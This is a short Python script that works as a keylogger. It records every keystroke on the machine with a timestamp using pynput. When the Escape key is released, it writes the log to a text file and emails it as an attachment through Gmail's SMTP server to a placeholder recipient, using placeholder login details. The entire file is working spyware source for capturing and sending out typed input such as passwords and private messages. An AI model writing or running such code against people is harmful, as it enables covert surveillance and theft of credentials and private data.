import pynput
import smtplib
import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication


key_log = []


def on_press(key):
    try:
        current = str(key.char)
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            current = " "
        elif key == pynput.keyboard.Key.enter:
            current = "\n"
        elif key == pynput.keyboard.Key.backspace:
            if len(key_log) > 0:
                key_log.pop()
            return
        else:
            current = str(key)

    key_log.append((datetime.datetime.now(), current))


def on_release(key):
    if key == pynput.keyboard.Key.esc:
        send_email()
        return False


def send_email():
    try:
        email = "email@gmail.com"
        password = " password"
        
        
        send_to_email = "send_to_email@gmail.com"
        subject = "Key Log"

        # create a user-friendly report of the key log
        report = ""
        for timestamp, key in key_log:
            report += f"{timestamp.strftime('%Y-%m-%d %H:%M:%S')}: {key}\n"

        # create a text file containing the key log
        filename = "key_log.txt"
        with open(filename, "w") as f:
            f.write(report)

        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = send_to_email
        msg['Subject'] = subject

        with open(filename, "rb") as f:
            attachment = MIMEApplication(f.read(), _subtype="txt")
            attachment.add_header('content-disposition', 'attachment', filename=filename)
            msg.attach(attachment)

        mail = smtplib.SMTP('smtp.gmail.com', 587)
        mail.ehlo()
        mail.starttls()
        mail.login(email, password)
        mail.sendmail(email, send_to_email, msg.as_string())
        print("*DATA SENT*")
        mail.close()

        # clear the key log after sending the email
        key_log.clear()

    except Exception as e:
        print(e)


with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
